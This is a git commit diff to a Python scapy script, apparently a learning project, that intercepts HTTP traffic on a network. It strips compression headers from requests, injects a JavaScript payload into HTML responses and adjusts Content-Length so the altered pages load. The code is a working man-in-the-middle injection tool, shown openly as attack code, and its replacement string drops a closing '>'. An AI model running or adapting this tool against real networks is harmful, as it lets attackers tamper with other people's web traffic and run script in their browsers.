3093b3ae5f9497770d5d08f99dc0be492f6cac39
ariyonaty <ari.h.yonaty@gmail.com>
2021-06-04 08:07:32 +0000

    Basic working model of code injector.

--- Code_Injector/code_injector.py
+++ Code_Injector/code_injector.py
@@ -6,10 +6,11 @@ from scapy.packet import Raw
 from scapy.layers.inet import IP, TCP
 
 redirect = b"HTTP/1.1 301 Moved Permanently\nLocation: https://arxiv.org/pdf/2105.14943.pdf\n\n" 
-payload = b"<script>alert('h4ck3d');</script></head>"
+payload = b"<script>alert('h4ck3d');</script>\n"
 
 def set_load(packet, load):
-    print(packet.show())
+
+    # print(packet.show())
     packet[Raw].load = load
 
     del packet[IP].len
@@ -26,11 +27,18 @@ def process_packet(packet):
         if scapy_packet[TCP].dport == 80:
             print("[+] HTTP Request")
             load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", load)
-            print(scapy_packet.show())
+            # print(scapy_packet.show())
         elif scapy_packet[TCP].sport == 80:
             print("[+] HTTP Response")
-            load = load.replace(b"</head>", payload)
-            print(scapy_packet.show())
+            load = load.replace(b"</body>", payload + b"</body")
+            content_length_search = re.search(b"(Content-Length:\s)(\d*)", load)
+            if content_length_search and b"text/html" in load:
+                content_length = content_length_search.group(2)
+                update_content_length = int(content_length.decode()) + len(payload)
+                print(f'Before: {content_length} ; After: {update_content_length}')
+
+                load = load.replace(content_length, str(update_content_length).encode())
+            # print(scapy_packet.show())
     
         if load != scapy_packet[Raw].load:
             mod_packet = set_load(scapy_packet, load)
